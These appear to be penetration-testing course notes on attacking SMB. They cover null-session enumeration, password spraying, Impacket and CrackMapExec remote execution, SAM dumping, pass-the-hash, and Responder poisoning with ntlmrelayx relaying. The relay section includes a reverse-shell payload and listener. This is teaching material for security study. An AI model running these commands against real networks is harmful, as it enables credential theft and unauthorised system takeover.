# Notes: Attacking SMB

## What is SMB?
- **Server Message Block (SMB)**: protocol for shared access to **files and printers** across network nodes.
- Originally ran over **NetBIOS over TCP/IP (NBT)**: TCP port **139**, UDP ports **137/138**.
- Since **Windows 2000**: can run **directly over TCP/IP on port 445** (no NetBIOS layer needed).
- Modern Windows uses SMB over TCP (445) but keeps NetBIOS as a **failover**.
- **Samba**: open-source Unix/Linux implementation of SMB — lets Linux/Unix servers interoperate with Windows SMB clients.
- **Port behavior:**
  - Port 445 → SMB directly over TCP/IP (typical modern Windows).
  - Port 139 → SMB over NetBIOS (if NetBIOS enabled, or targeting non-Windows hosts).
- **MSRPC (Microsoft RPC)**: related protocol; lets developers invoke remote procedures without handling networking directly. Defined by **MS-RPCE**, which specifies RPC over SMB using **named pipes** as transport.

### General attack approach
1. Understand implementation/OS.
2. Abuse misconfiguration or excessive privileges.
3. Exploit known (or new) vulnerabilities.
4. Review contents of any accessible shares.
5. Check what NetBIOS/RPC exposes.

## Enumeration

### Nmap scan
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
Example output reveals:
```
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```
- Reveals: **SMB version** (Samba 4.6.2), **hostname** (HTB), and OS inferred as **Linux** (via Samba).
- Note: Nmap usually **can't directly fingerprint Windows versions** — it guesses based on behavior/signatures.

## Misconfigurations

### Null Session (Anonymous Authentication)
- SMB can be configured to **not require credentials** — a "null session."
- Tools supporting null sessions: `smbclient`, `smbmap`, `rpcclient`, `enum4linux`.

#### File shares — smbclient
```bash
smbclient -N -L //10.129.14.128
```
- `-N`: null session; `-L`: list shares.

#### File shares — smbmap (shows permissions too)
```bash
smbmap -H 10.129.14.128
```
- Recursive browsing:
```bash
smbmap -H 10.129.14.128 -r notes
```
- Download a file:
```bash
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
- Upload a file (if WRITE access):
```bash
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

### RPC enumeration — rpcclient
```bash
rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers
```
- Lists domain users and their RIDs via null session.

### enum4linux / enum4linux-ng
- Automates enumeration using `nmblookup`, `net`, `rpcclient`, `smbclient`.
- Gathers: workgroup/domain name, users, OS info, groups, shares, password policy.
```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```

## Protocol-Specific Attacks (Credential-based)

### Brute Forcing vs. Password Spraying
- **Brute forcing**: many passwords per account → risk of **account lockout**.
- **Password spraying**: one (or few) common password(s) across **many usernames** → avoids lockouts.
  - Typically safe: 2–3 attempts, waiting **30–60 min** between rounds.

#### CrackMapExec (CME) — password spray
```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
- `-u`: user list file, `-p`: password to spray.
- `--local-auth`: required for **non-domain-joined** targets.
- Default: stops after first success → use `--continue-on-success` to keep spraying.
- `(Pwn3d!)` tag = confirmed valid admin-level access.

## SMB Exploitation (Windows)

- **Linux SMB**: mostly limited to file system access, privilege abuse, known exploits.
- **Windows SMB**: much larger attack surface if privileges allow:
  - Remote Command Execution
  - SAM hash extraction
  - Enumerating logged-on users
  - Pass-the-Hash (PtH)

### Remote Code Execution (RCE)

#### Background: Sysinternals / PsExec
- **Sysinternals** (1996, Mark Russinovich & Bryce Cogswell; acquired by Microsoft 2006) — admin/diagnostic tools for Windows.
- **PsExec**: executes processes on remote systems with console interactivity, no manual client install.
  - Embeds a **Windows service image** in its executable.
  - Deploys it to the **ADMIN$** share by default.
  - Uses **DCE/RPC over SMB** to talk to the **Service Control Manager**.
  - Starts the service → creates a **named pipe** for sending commands.

#### Linux-based implementations
| Tool | Approach |
|---|---|
| **Impacket PsExec** | RemComSvc-based, PsExec-like |
| **Impacket SMBExec** | No RemComSvc; starts a local SMB server to receive command output — useful when no writable share exists |
| **Impacket atexec** | Executes via **Task Scheduler service** |
| **CrackMapExec** | Includes smbexec and atexec implementations |
| **Metasploit PsExec** | Ruby implementation |

#### Impacket PsExec usage
```bash
impacket-psexec -h
impacket-psexec administrator:'Password123!'@10.10.110.17
```
- Uploads a service binary to ADMIN$, starts it via SVCManager → drops into a `nt authority\system` shell.
- Same options apply to `impacket-smbexec` and `impacket-atexec`.

#### CrackMapExec — run commands
```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
- `-x`: run CMD command; `-X` (uppercase): run PowerShell.
- `--exec-method`: defaults to **atexec**; fall back to **smbexec** if it fails.

### Enumerating Logged-on Users
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
- Useful across a subnet when a shared local admin account exists — speeds up lateral movement recon.

### Extracting SAM Database Hashes
- **SAM (Security Account Manager)**: stores local user password hashes.
- Requires **admin privileges** on target.
```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
- Uses of extracted hashes:
  - Authenticate as another user
  - Crack passwords (e.g., for reuse elsewhere)
  - **Pass-the-Hash**

### Pass-the-Hash (PtH)
- Authenticate using the **NTLM hash** directly — no need to crack the plaintext password.
```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
- Works with Impacket tools, SMBMap, CrackMapExec, etc.

## Forced Authentication Attacks (Responder)

### Concept
- Set up a **fake SMB server** to capture **NetNTLMv1/v2 hashes** by abusing broken name-resolution trust.
- Key tool: **Responder** — LLMNR, NBT-NS, and MDNS **poisoner**.

### Windows Name Resolution order (why this works)
1. Check **hosts file** (`C:\Windows\System32\Drivers\etc\hosts`)
2. Check **local DNS cache**
3. Query **configured DNS server**
4. If all fail → **multicast query** to the local network (LLMNR/NBT-NS/MDNS)
- If a user **mistypes** a share name (e.g., `\\mysharefoder\` instead of `\\mysharedfolder\`), resolution fails through normal channels and falls back to **multicast**, which has **no integrity verification** — Responder can impersonate the requested host and harvest credentials.

### Running Responder
```bash
responder -I <interface>
sudo responder -I ens33
```
- Spins up poisoners (LLMNR/NBT-NS/MDNS) and fake services (SMB, HTTP, FTP, SQL, Kerberos, LDAP, RDP, WinRM, etc.).
- Captures hashes like:
  ```
  [SMB] NTLMv2-SSP Username : WIN7BOX\demouser
  [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:...
  ```
- Hashes saved to: `/usr/share/responder/logs/`.
- **Note:** multiple hashes for the same account are normal — NTLMv2 uses **randomized client/server challenges** each time, so hashes differ even for the same password.

### Cracking captured hashes
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
- `-m 5600`: NetNTLMv2 mode.
- Example result: password cracked → `P@ssword`.

### Relaying hashes (if not crackable) — ntlmrelayx
- First, **disable Responder's own SMB server** (`/etc/responder/Responder.conf`: `SMB = Off`) to avoid conflicts.
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
- Relays the captured auth attempt to a **target machine** instead of just capturing it.
- By default: dumps the target's **SAM database**.
- Can also execute commands directly:
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<base64 PowerShell reverse shell>'
```
- Reverse shell payload generated via **revshells.com** (PowerShell #3 Base64 option).
- Victim authenticates → relay triggers the payload → attacker catches a shell:
```bash
nc -lvnp 9001
```
Result: `nt authority\system` shell on the relayed target.

## RPC — Beyond Enumeration
- RPC isn't just for recon — with the right permissions, it can be used to:
  - **Change a user's password**
  - **Create a new domain user**
  - **Create a new shared folder**
- Requires specific server-side configuration to permit these changes.
- Related references: **Footprinting module** (RPC enumeration) and **Active Directory Enumeration & Attacks module** (deeper AD-focused RPC usage).

## Summary: SMB attack toolkit

| Goal | Tool(s) |
|---|---|
| Port/service discovery | Nmap (`-sV -sC -p139,445`) |
| Null session share listing | `smbclient -N -L`, `smbmap` |
| Null session user/domain enum | `rpcclient`, `enum4linux-ng` |
| Password spraying | CrackMapExec (`-u` list, `-p` password) |
| Remote command execution | Impacket (`psexec`, `smbexec`, `atexec`), CrackMapExec |
| Enumerate logged-on users | CrackMapExec `--loggedon-users` |
| Dump local hashes | CrackMapExec `--sam` |
| Authenticate without cracking | Pass-the-Hash (`-H` flag) |
| Capture hashes via poisoning | Responder |
| Relay captured hashes | `impacket-ntlmrelayx` |

## Key takeaways
1. **Null sessions** are a major misconfiguration — they expose shares, users, groups, and policies with **zero credentials**.
2. **Password spraying** (not brute forcing) is the safer credential-guessing approach — avoids lockouts.
3. Windows SMB has a **much larger post-exploitation surface** than Linux/Samba: RCE, SAM dumping, PtH.
4. **Pass-the-Hash** means a cracked password isn't even necessary — the NTLM hash alone can grant access.
5. **Responder** exploits a fundamental weakness in legacy name resolution (LLMNR/NBT-NS/MDNS have no integrity checks) to harvest or relay credentials — a very common and high-impact internal network attack.
6. RPC can be used for **both enumeration and active changes** (password resets, user/share creation) if permissions allow.
